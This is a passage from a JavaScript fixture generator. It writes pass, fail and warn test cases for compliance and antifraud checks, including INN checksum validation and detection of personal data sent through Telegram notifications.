      match: "OPERATOR_ADDRESS_REQUIRED",
    },
    "pass-no-address-m1": {
      description: "M1: адрес ещё не обязателен",
      milestone: "M1",
      spec: [{ op: "remove", path: "/compliance/operatorAddress" }],
    },
    "fail-inn": {
      description: "ИНН с неверной контрольной суммой",
      spec: [{ op: "set", path: "/compliance/operatorInn", value: "7707083894" }],
      match: "INN_INVALID",
    },
    "pass-inn": {
      description: "ИНН-10 и ИНН-12 верные",
      spec: [{ op: "set", path: "/compliance/operatorInn", value: "500100732259" }],
    },
  },
  "G2-TG-01": {
    pass: { description: "форум: в Telegram только время и ссылка" },
    "fail-template": {
      description: "шаблон Telegram подставляет ФИО",
      base: "bakery",
      spec: [
        { op: "set", path: "/workflows/0/steps/0/params/text", value: "Заказ {{customer_name}} принят" },
      ],
    },
    "fail-function-args": {
      description: "функция шлёт в Telegram телефон держателя",
      ...addFn(
        F,
        {
          name: "notifyHolder",
          kind: "action",
          file: "functions/notifyHolder.ts",
          public: true,
          roles: ["organizer"],
        },
        // biome-ignore lint/suspicious/noTemplateCurlyInString: generated function source
        '    const t = await ctx.runQuery("ticketAvailability", {});\n    const holder = { holder_phone: "x" };\n    await ctx.connectors.telegram.sendToUser({ userId: "u", text: `Телефон: ${holder.holder_phone}` });\n    return t;',
      ),
      match: "holder_phone",
    },
  },
  "G2-AF-08": {
    pass: { description: "эталон форума" },
    "warn-score": { ...SCORE["warn-new-free-urgent-brand"], expect: "warn" },
  },
  "G2-AF-09": {
    pass: { description: "кондитерская: текст заказа читает только персонал-админ", base: "bakery" },
    "warn-ori": {
      description: "форум: заявку спикера (текст) пишет спикер, читает модератор",
      match: "founder_review",
    },
  },
};
// Antifraud blockers: pass = forum, fail = one block fixture each.
for (const id of ["G2-AF-01", "G2-AF-02", "G2-AF-03", "G2-AF-04", "G2-AF-05", "G2-AF-06", "G2-AF-07"]) {
  CHECKS[id] = { pass: { description: "эталон форума" } };
  for (const [name, c] of Object.entries(BLOCK)
    .filter(([, c]) => c.check === id)
    .slice(0, 2))
    CHECKS[id][`fail-${name}`] = { ...c };
}

// ------------------------------------------------------------------------------------------------ output

const norm = (c, extra) => {
  const out = { ...extra, ...c };
  out.base ??= "forum";
  delete out.check;
  return { check: c.check ?? extra.check, ...out };
};

export function antifraudCases() {
  const out = [];
  for (const [name, c] of Object.entries(BLOCK))
    out.push({ dir: "block", name, case: norm(c, { expect: "block", description: name }) });
  for (const [name, c] of Object.entries(ALLOW))
    out.push({ dir: "allow", name, case: norm(c, { expect: "allow" }) });
  for (const [name, c] of Object.entries(SCORE))
    out.push({ dir: "score", name, case: norm(c, { check: "G2-AF-08" }) });
  return out;
}

export function checkCases() {
  const out = [];
  for (const [check, cases] of Object.entries(CHECKS)) {
    for (const [name, c] of Object.entries(cases)) {
      const expect =
        c.expect && c.expect !== "block"
          ? c.expect
          : name.startsWith("fail")
            ? "fail"
            : name.startsWith("warn")
              ? "warn"
              : "pass";
      out.push({
        check,
        name,
        case: { ...norm({ ...c, check }, {}), expect, description: c.description ?? name },
      });
    }
  }
  return out;
}

export function writeG2Fixtures() {
  rmSync(ANTIFRAUD_DIR, { recursive: true, force: true });
  for (const { dir, name, case: c } of antifraudCases()) {
    mkdirSync(join(ANTIFRAUD_DIR, dir), { recursive: true });
    writeFileSync(join(ANTIFRAUD_DIR, dir, `${name}.json`), `${JSON.stringify(c, null, 2)}\n`);
  }
  for (const d of readdirSync(FIXTURES_DIR).filter((x) => x.startsWith("G2-")))
    rmSync(join(FIXTURES_DIR, d), { recursive: true, force: true });
  for (const { check, name, case: c } of checkCases()) {
    mkdirSync(join(FIXTURES_DIR, check), { recursive: true });
    writeFileSync(join(FIXTURES_DIR, check, `${name}.json`), `${JSON.stringify(c, null, 2)}\n`);
  }
  return { antifraud: antifraudCases().length, checks: checkCases().length };
}

if (process.argv[1] && resolve(process.argv[1]) === fileURLToPath(import.meta.url)) {
  console.log(writeG2Fixtures());
}
